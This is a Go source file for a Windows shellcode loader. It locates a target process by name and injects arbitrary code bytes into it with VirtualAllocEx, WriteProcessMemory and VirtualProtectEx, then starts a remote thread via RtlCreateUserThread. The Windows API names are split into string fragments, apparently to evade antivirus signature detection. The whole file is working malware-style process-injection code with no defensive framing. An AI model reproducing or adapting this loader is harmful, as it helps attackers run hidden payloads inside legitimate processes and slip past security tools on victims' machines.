package loader

import (
	"upx/utils"
	"unsafe"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
)

func RunRtl(code []byte) {
	processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == utils.GetExpName() {
			pid = process.Pid()
			break
		}
	}
	kl32 := utils.GetWinDLL(utils.GetKe32DllName())
	ntdll := windows.NewLazySystemDLL(utils.GetNtDllName())
	OpenProcess := kl32.NewProc("Open" + "Process")
	VirAllEx := kl32.NewProc("Vir" + "tual" + "Alloc" + "Ex")
	VirlProEx := kl32.NewProc("Virt" + "ual" + "Protect" + "Ex")
	WritePemory := kl32.NewProc("Write" + "Process" + "Memory")
	RtCUserThread := ntdll.NewProc("Rtl" + "Create" + "User" + "Thread")
	CloseHandle := kl32.NewProc("Close" + "Handle")
	pHandle, _, _ := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		0, uintptr(uint32(pid)))
	addr, _, _ := VirAllEx.Call(pHandle, 0, uintptr(len(code)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	_, _, _ = WritePemory.Call(pHandle, addr, (uintptr)(unsafe.Pointer(&code[0])),
		uintptr(len(code)))
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirlProEx.Call(pHandle, addr, uintptr(len(code)),
		windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	var tHandle uintptr
	_, _, _ = RtCUserThread.Call(pHandle, 0, 0, 0, 0, 0, addr, 0,
		uintptr(unsafe.Pointer(&tHandle)), 0)
	_, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))
}
